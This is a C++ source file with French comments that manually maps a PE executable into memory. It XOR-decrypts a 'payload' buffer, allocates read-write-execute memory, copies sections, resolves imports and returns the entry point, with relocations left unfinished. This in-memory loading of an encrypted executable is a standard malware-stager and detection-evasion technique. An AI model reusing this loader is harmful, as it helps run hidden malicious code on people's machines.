#include "pe_loader.h"

BYTE* ManualMapPE(const uint8_t* rawData, size_t rawSize, uint8_t XOR_KEY, LPVOID& entryPoint)
{
    // buffer modifiable
    uint8_t* localCopy = new uint8_t[rawSize];
    std::memcpy(localCopy, rawData, rawSize);

    xorDecryptPayload(localCopy, rawSize, XOR_KEY);

    // Vérifier la signature MZ / PE
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(localCopy);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[!] Signature MZ invalide.\n";
        delete[] localCopy;
        return nullptr;
    }

    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(localCopy + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[!] Signature PE invalide.\n";
        delete[] localCopy;
        return nullptr;
    }

    // Allouer SizeOfImage
    SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
    SIZE_T sizeOfHeader = ntHeaders->OptionalHeader.SizeOfHeaders;
    BYTE* baseAlloc = reinterpret_cast<BYTE*>(
        VirtualAlloc(
            reinterpret_cast<LPVOID>(ntHeaders->OptionalHeader.ImageBase),
            sizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        ));

    if (!baseAlloc) {
        std::cout << "Allouer null ptr" << std::endl;
        // Si l'allocation à l'ImageBase échoue, on essaye n'importe où
        baseAlloc = reinterpret_cast<BYTE*>(
            VirtualAlloc(
                nullptr,
                sizeOfImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            ));
    }

    if (!baseAlloc) {
        std::cerr << "[!] Echec allocation memoire pour l'image.\n";
        delete[] localCopy;
        return nullptr;
    }

    // Copier les headers
    std::memcpy(baseAlloc, localCopy, sizeOfHeader);

    // Copier les sections
    PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders); // macro qui renvoie un pointeur vers le premier en-tête de section d'un fichier PE.

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        BYTE* dest = baseAlloc + sectionHeaders[i].VirtualAddress;
        BYTE* src = localCopy + sectionHeaders[i].PointerToRawData;
        DWORD size = sectionHeaders[i].SizeOfRawData;

        // securite check si la taille du payload ne depasse pas
        if (sectionHeaders[i].PointerToRawData + size > rawSize) {
            std::cerr << "[!] Section " << i << " dépasse la taille brute du payload.\n";
            VirtualFree(baseAlloc, 0, MEM_RELEASE);
            delete[] localCopy;
            return nullptr;
        }

        std::memcpy(dest, src, size);
    }

    // faire les relocations (todo)

    // Résoudre imports
    if (!ResolveImports(baseAlloc)) {
        std::cerr << "[!] Echec résolution imports.\n";
        VirtualFree(baseAlloc, 0, MEM_RELEASE);
        delete[] localCopy;
        return nullptr;
    }

    entryPoint = baseAlloc + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    delete[] localCopy;

    return baseAlloc;
}